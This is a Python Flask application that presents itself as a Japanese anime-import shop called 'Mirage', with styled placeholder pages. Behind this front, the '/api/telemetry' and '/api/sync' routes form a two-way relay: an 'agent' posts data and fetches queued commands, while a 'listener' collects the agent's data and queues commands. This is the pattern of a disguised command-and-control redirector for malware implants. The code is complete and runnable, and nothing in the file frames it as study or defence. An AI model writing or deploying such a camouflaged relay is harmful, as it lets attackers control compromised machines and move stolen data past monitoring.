from flask import Flask, request, jsonify, render_template_string
from collections import deque
import base64

app = Flask(__name__)

agent_to_listener = deque()
listener_to_agent = deque()

# ─────────────────────────────────────────────
# 1. THE STYLING 
# ─────────────────────────────────────────────
BASE_STYLE = """
@import url('https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+New:wght=300;400;700;900&family=Noto+Serif+JP:wght=300;600&display=swap');
:root {
    --bg: #0a0a0f; --surface: #12121a; --border: #1e1e2e;
    --accent: #e040a0; --accent-glow: rgba(224, 64, 160, 0.3);
    --text: #e8e8f0; --muted: #8b8ba8;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
body { background: var(--bg); color: var(--text); font-family: 'Zen Kaku Gothic New', sans-serif; min-height: 100vh; }
.container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }
nav { position: fixed; top: 0; width: 100%; z-index: 100; padding: 1.5rem 0; background: rgba(10, 10, 15, 0.8); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
.nav-content { display: flex; justify-content: space-between; align-items: center; }
.logo { font-family: 'Noto Serif JP', serif; font-size: 1.5rem; color: var(--accent); text-decoration: none; font-weight: 600; }
.logo span { color: var(--text); font-weight: 300; }
.nav-links { display: flex; gap: 2rem; list-style: none; }
.nav-links a { color: var(--muted); text-decoration: none; font-size: 0.8rem; text-transform: uppercase; }
.hero { padding: 12rem 0 6rem; text-align: center; }
.hero h1 { font-family: 'Noto Serif JP', serif; font-size: 4rem; margin-bottom: 1.5rem; }
.card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 2rem; }
.card { background: var(--surface); border: 1px solid var(--border); padding: 2.5rem; }
footer { padding: 4rem 0; border-top: 1px solid var(--border); margin-top: 8rem; text-align: center; color: var(--muted); }
"""

BASE_LAYOUT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Mirage — Rare Anime Imports</title><style>{{ style }}</style>
</head>
<body>
    <nav>
        <div class="container nav-content">
            <a href="/" class="logo">鏡 <span>Mirage</span></a>
            <ul class="nav-links">
                <li><a href="/">Home</a></li><li><a href="/catalog">Catalog</a></li><li><a href="/about">About</a></li>
            </ul>
        </div>
    </nav>
    <main class="container">{{ body_content | safe }}</main>
    <footer><p>&copy; 2026 Mirage Imports. Shipped from Tokyo to the World.</p></footer>
</body>
</html>
"""

def render_mirage(content_html):
    return render_template_string(BASE_LAYOUT, style=BASE_STYLE, body_content=content_html)

@app.route("/")
def index():
    html = """
    <section class="hero">
        <h1>Curated Japanese Artifacts <br> <span style="font-weight:300; font-size: 0.5em; color: var(--muted);">日本からの限定品</span></h1>
    </section>
    """
    return render_mirage(html)

@app.route("/catalog")
def catalog(): return render_mirage("<h2>Catalog Page</h2>")

@app.route("/about")
def about(): return render_mirage("<h2>About Us</h2>")

# ─────────────────────────────────────────────
# TWO-WAY MAILBOX RELAY ENDPOINTS
# ─────────────────────────────────────────────

@app.route("/api/telemetry", methods=['POST'])
def agent_upload():
    data = request.json.get("data")
    if data:
        agent_to_listener.append(data)
    return jsonify({"status": "ok"})

@app.route("/api/telemetry", methods=['GET'])
def agent_download():
    if listener_to_agent:
        return jsonify({"status": "ok", "data": listener_to_agent.popleft()})
    return jsonify({"status": "ok", "data": None})

@app.route("/api/sync", methods=['POST'])
def listener_upload():
    data = request.json.get("data")
    if data:
        listener_to_agent.append(data)
    return jsonify({"status": "ok", "data": None})

@app.route("/api/sync", methods=["GET"])
def listener_download():
    if agent_to_listener:
        return jsonify({"status": "ok", "data": agent_to_listener.popleft()})  
    return jsonify({"status": "ok", "data": None})

if __name__ == "__main__":
    print("[mirage] Aesthetic interface live on http://localhost:4696")
    app.run(host="0.0.0.0", port=4696, debug=False)